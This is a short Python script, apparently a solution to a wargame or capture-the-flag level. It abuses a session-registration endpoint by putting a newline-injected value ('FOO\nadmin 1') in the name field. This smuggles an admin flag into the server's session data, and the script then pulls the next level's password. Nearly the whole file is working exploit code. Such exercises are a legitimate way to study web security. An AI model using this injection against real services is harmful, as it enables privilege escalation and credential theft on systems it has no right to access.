import Auther


def registerSession():
    with Auther.request(20, data={"name": "FOO\nadmin 1"}, cookies=Auther.FOOSessionCookie(20)) as r:
        return r.text
    return ""


text = registerSession()  # register data
if "You are an admin" not in text:
    text = registerSession()  # read data
Auther.passwordColonGetter(text, 21)()
